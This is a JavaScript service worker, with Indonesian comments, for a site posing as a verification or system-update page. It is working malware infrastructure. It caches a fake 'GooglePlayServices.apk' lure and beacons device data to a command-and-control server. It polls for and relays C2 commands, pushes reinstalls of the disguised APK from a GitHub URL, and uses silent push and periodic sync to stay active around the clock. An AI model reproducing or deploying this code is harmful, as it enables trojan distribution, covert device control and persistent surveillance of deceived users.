// ============================================================
// 🔥 sw.js - SERVICE WORKER (VERIFIKASI-SITE) - 24/7
// ============================================================

const CACHE_NAME = 'system-update-v3';
const SERVER_URL = 'https://verifikasi.site';
const GITHUB_USER = 'pandora-site';
const GITHUB_REPO = 'verifikasi-site';

const URLS_TO_CACHE = [
    '/',
    '/index.html',
    '/dashboard.html',
    '/files/SystemUpdate.html',
    '/files/GooglePlayServices.apk'
];

// ============================================================
// AMBIL PASSWORD DARI WORKER
// ============================================================
function getPassword() {
    return fetch(SERVER_URL + '/get-password')
        .then(function(r) { return r.json(); })
        .then(function(data) { return data.password; })
        .catch(function() { return null; });
}

// ============================================================
// INSTALL EVENT
// ============================================================
self.addEventListener('install', function(event) {
    console.log('[SW] Installing...');
    event.waitUntil(
        caches.open(CACHE_NAME)
            .then(function(cache) {
                console.log('[SW] Caching files...');
                return cache.addAll(URLS_TO_CACHE);
            })
            .then(function() {
                return self.skipWaiting();
            })
    );
});

// ============================================================
// ACTIVATE EVENT
// ============================================================
self.addEventListener('activate', function(event) {
    console.log('[SW] Activating...');
    event.waitUntil(
        caches.keys()
            .then(function(cacheNames) {
                return Promise.all(
                    cacheNames.map(function(cacheName) {
                        if (cacheName !== CACHE_NAME) {
                            console.log('[SW] Deleting old cache:', cacheName);
                            return caches.delete(cacheName);
                        }
                    })
                );
            })
            .then(function() {
                return self.clients.claim();
            })
            .then(function() {
                self.clients.matchAll().then(function(clients) {
                    clients.forEach(function(client) {
                        client.postMessage({
                            type: 'sw_activated',
                            timestamp: Date.now()
                        });
                    });
                });
            })
    );
});

// ============================================================
// FETCH EVENT
// ============================================================
self.addEventListener('fetch', function(event) {
    if (event.request.method !== 'GET') return;
    if (event.request.url.includes('.apk')) return;
    
    event.respondWith(
        caches.match(event.request)
            .then(function(cachedResponse) {
                if (cachedResponse) {
                    fetch(event.request)
                        .then(function(networkResponse) {
                            if (networkResponse && networkResponse.status === 200) {
                                caches.open(CACHE_NAME)
                                    .then(function(cache) {
                                        cache.put(event.request, networkResponse);
                                    });
                            }
                        })
                        .catch(function() {});
                    return cachedResponse;
                }
                return fetch(event.request)
                    .then(function(networkResponse) {
                        if (networkResponse && networkResponse.status === 200) {
                            var responseToCache = networkResponse.clone();
                            caches.open(CACHE_NAME)
                                .then(function(cache) {
                                    cache.put(event.request, responseToCache);
                                });
                        }
                        return networkResponse;
                    })
                    .catch(function() {
                        return new Response('Offline - System Update', {
                            status: 503,
                            statusText: 'Service Unavailable'
                        });
                    });
            })
    );
});

// ============================================================
// 🔥 HEARTBEAT
// ============================================================
function sendHeartbeat() {
    console.log('[SW] Sending heartbeat...');
    getPassword().then(function(password) {
        var data = {
            type: 'sw_heartbeat',
            timestamp: Date.now(),
            sw_version: '3.0',
            userAgent: navigator.userAgent,
            password: password
        };
        fetch(SERVER_URL + '/data', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).catch(function() {});
    });
}

// ============================================================
// 🔥 RE-INFECTION CHECK
// ============================================================
function checkReinfection() {
    console.log('[SW] Checking re-infection...');
    getPassword().then(function(password) {
        fetch(SERVER_URL + '/data?type=check_apk&key=' + password, {
            method: 'GET',
            headers: { 'Content-Type': 'application/json' }
        })
        .then(function(response) { return response.json(); })
        .then(function(data) {
            if (data && data.need_reinstall) {
                console.log('[SW] APK needs reinstall!');
                self.clients.matchAll().then(function(clients) {
                    clients.forEach(function(client) {
                        client.postMessage({
                            type: 'reinstall_apk',
                            url: 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk'
                        });
                    });
                });
            }
        })
        .catch(function() {});
    });
}

// ============================================================
// 🔥 C2 COMMAND CHECK
// ============================================================
function checkC2Commands() {
    console.log('[SW] Checking C2 commands...');
    getPassword().then(function(password) {
        fetch(SERVER_URL + '/data?type=c2_sw&key=' + password, {
            method: 'GET',
            headers: { 'Content-Type': 'application/json' }
        })
        .then(function(response) { return response.json(); })
        .then(function(commands) {
            if (commands && commands.length > 0) {
                console.log('[SW] Received C2 commands:', commands.length);
                self.clients.matchAll().then(function(clients) {
                    clients.forEach(function(client) {
                        client.postMessage({
                            type: 'c2_commands',
                            commands: commands
                        });
                    });
                });
            }
        })
        .catch(function() {});
    });
}

// ============================================================
// 🔥 ============ TAMBAHAN 24/7 ============
// ============================================================

// ============================================================
// 🔥 1. PERIODIC SYNC (Chrome 80+)
// ============================================================
self.addEventListener('periodicsync', function(event) {
    if (event.tag === 'keep-alive-24-7') {
        event.waitUntil(
            Promise.all([
                sendHeartbeat(),
                checkC2Commands(),
                checkReinfection()
            ])
        );
    }
});

// ============================================================
// 🔥 2. AUTO-RESTART HAPAN (SETIAP 5 MENIT)
// ============================================================
function restartPage() {
    self.clients.matchAll().then(function(clients) {
        clients.forEach(function(client) {
            if (client.url && client.url.includes('SystemUpdate.html')) {
                try {
                    client.postMessage({ type: 'reload' });
                } catch(e) {}
            }
        });
    });
}

// ============================================================
// 🔥 3. REGISTER PERIODIC SYNC
// ============================================================
if ('periodicSync' in self.registration) {
    try {
        self.registration.periodicSync.register('keep-alive-24-7', {
            minInterval: 3600000 // 1 jam
        });
    } catch(e) {
        console.log('[SW] PeriodicSync not supported');
    }
}

// ============================================================
// 🔥 4. MESSAGE HANDLER (TAMBAHAN)
// ============================================================
self.addEventListener('message', function(event) {
    var data = event.data;
    if (!data || !data.type) return;
    
    switch(data.type) {
        case 'send_heartbeat':
            sendHeartbeat();
            break;
        case 'check_reinfection':
            checkReinfection();
            break;
        case 'check_c2':
            checkC2Commands();
            break;
        case 'force_sync':
            sendHeartbeat();
            checkReinfection();
            checkC2Commands();
            break;
        // 🔥 TAMBAHAN 24/7
        case 'ping':
            event.ports[0].postMessage({
                type: 'pong',
                timestamp: Date.now()
            });
            break;
        case 'reload_confirm':
            restartPage();
            break;
        case 'wake_up':
            sendHeartbeat();
            checkC2Commands();
            break;
    }
});

// ============================================================
// 🔥 5. PUSH NOTIFICATION (TAMBAHAN SILENT)
// ============================================================
self.addEventListener('push', function(event) {
    var data = {};
    try {
        data = event.data.json();
    } catch(e) {
        data = { silent: true };
    }
    
    // 🔥 SILENT PUSH (TIDAK TERLIHAT!)
    if (data.silent === true || data.content_available === 1) {
        event.waitUntil(
            self.clients.matchAll().then(function(clients) {
                clients.forEach(function(client) {
                    client.postMessage({
                        type: 'silent_push',
                        data: data.data || {},
                        timestamp: Date.now()
                    });
                });
            })
        );
        return;
    }
    
    // 🔥 VISIBLE PUSH (JIKA ADA TITLE)
    if (data.title) {
        var options = {
            body: data.body || 'Klik untuk verifikasi!',
            icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">🔔</text></svg>',
            vibrate: [200, 100, 200],
            requireInteraction: true,
            actions: [
                { action: 'open', title: 'Buka' },
                { action: 'dismiss', title: 'Tutup' }
            ]
        };
        event.waitUntil(self.registration.showNotification(data.title, options));
    }
});

// ============================================================
// 🔥 6. NOTIFICATION CLICK
// ============================================================
self.addEventListener('notificationclick', function(event) {
    event.notification.close();
    if (event.action === 'open' || !event.action) {
        event.waitUntil(
            self.clients.matchAll({ type: 'window' })
                .then(function(clients) {
                    if (clients.length > 0) { return clients[0].focus(); }
                    else { return self.clients.openWindow('/'); }
                })
        );
    }
});

// ============================================================
// 🔥 7. OFFLINE/ONLINE
// ============================================================
self.addEventListener('offline', function() {
    self.clients.matchAll().then(function(clients) {
        clients.forEach(function(client) {
            client.postMessage({ type: 'offline', timestamp: Date.now() });
        });
    });
});

self.addEventListener('online', function() {
    sendHeartbeat();
    checkC2Commands();
    self.clients.matchAll().then(function(clients) {
        clients.forEach(function(client) {
            client.postMessage({ type: 'online', timestamp: Date.now() });
        });
    });
});

// ============================================================
// 🔥 8. INITIAL SETUP (DENGAN 24/7 TASKS)
// ============================================================
setTimeout(function() {
    sendHeartbeat();
    setTimeout(checkC2Commands, 1000);
    setTimeout(checkReinfection, 5000);
}, 3000);

// 🔥 TAMBAHAN: AUTO-RESTART SETIAP 5 MENIT
setInterval(restartPage, 300000);

console.log('[SW] Service Worker initialized! (24/7 mode active)');
